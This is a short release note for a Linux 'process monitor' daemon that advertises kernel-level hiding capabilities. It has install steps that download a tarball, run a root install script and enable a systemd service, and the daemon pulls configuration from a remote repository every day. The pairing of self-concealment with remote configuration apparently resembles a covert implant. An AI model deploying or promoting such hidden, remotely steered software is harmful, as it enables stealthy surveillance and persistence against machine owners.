# Release v1.0.0

## Process Monitor v1.0.0 - Initial Stable Release

First stable release of the Linux process monitoring system with kernel-level hiding capabilities.

### What's Included

| File | Description |
|------|-------------|
| `config-publisher-linux-amd64` | Configuration publishing tool |
| `encrypt-config-linux-amd64` | Configuration encryption tool |
| `install.sh` | Installation script |
| `uninstall.sh` | Uninstallation script |
| `INSTALL.md` | Detailed installation guide |
| `README.md` | Project overview |
| `LICENSE` | MIT License |

### SHA256 Checksums

```
8c7ddd58325f86f9646d358ab19c6efbccc00263ae0a215cf6940ad0b7c61148  process-monitor-v1.0.0-linux-amd64.tar.gz
```

### Installation

```bash
# Download
wget https://github.com/JuliaRandolph/process-monitor/releases/download/v1.0.0/process-monitor-v1.0.0-linux-amd64.tar.gz

# Extract
tar -xzf process-monitor-v1.0.0-linux-amd64.tar.gz

# Install
cd v1.0.0
sudo ./install.sh

# Start
sudo systemctl start process-monitor
sudo systemctl enable process-monitor
```

### Configuration Repository

https://github.com/JuliaRandolph/process-monitor-config

The daemon will automatically check this repository daily for configuration updates.
